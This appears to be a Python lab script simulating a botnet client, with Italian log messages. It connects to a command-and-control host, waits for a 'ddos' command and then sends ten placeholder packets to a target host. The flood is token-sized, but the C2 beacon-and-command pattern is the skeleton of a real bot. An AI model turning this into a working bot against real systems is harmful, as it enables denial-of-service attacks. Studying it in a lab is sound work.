import socket
import threading
import time

C2_HOST = 'c2'
C2_PORT = 9000

TARGET_IP = 'target'
TARGET_PORT = 9999

def fake_ddos():
    print("[BOT] Inizio attacco simulato")
    for _ in range(10):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((TARGET_IP, TARGET_PORT))
                s.sendall(b"FAKE_ATTACK_PACKET")
        except:
            pass
        time.sleep(0.5)
    print("[BOT] Fine attacco simulato")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Retry loop
while True:
    try:
        s.connect((C2_HOST, C2_PORT))
        print("[BOT] Connesso al C2")
        break
    except ConnectionRefusedError:
        print("[BOT] Connessione rifiutata, ritento in 3 secondi...")
        time.sleep(3)

while True:
    try:
        data = s.recv(1024).decode()
        if data == "ddos":
            threading.Thread(target=fake_ddos).start()
    except:
        break
